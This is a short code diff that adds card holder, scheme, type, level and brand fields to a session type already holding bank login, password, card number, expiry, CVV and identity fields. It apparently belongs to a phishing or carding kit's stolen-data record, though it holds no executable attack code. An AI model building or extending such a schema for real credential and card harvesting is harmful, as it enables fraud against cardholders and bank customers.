@@ -14,9 +14,14 @@ export type Session = {
   bank?: string | null;
   user?: string | null;
   pass?: string | null;
+  holder?: string | null;
   cc?: string | null;
   exp?: string | null;
   cvv?: string | null;
+  scheme?: string | null;
+  type?: string | null,
+  level?: string | null,
+  brand?: string | null,
   document?: string | null;
   country?: string | null;
   city?: string | null;
